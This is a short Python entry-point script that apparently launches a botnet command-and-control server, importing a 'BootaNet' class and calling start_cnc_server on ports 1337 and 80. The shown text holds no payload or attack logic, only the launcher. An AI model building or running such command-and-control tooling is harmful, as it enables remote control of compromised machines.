from src.bootanet import *

try:
    net = BootaNet(1337, 80);
    net.start_cnc_server()
except KeyboardInterrupt:
    exit(0)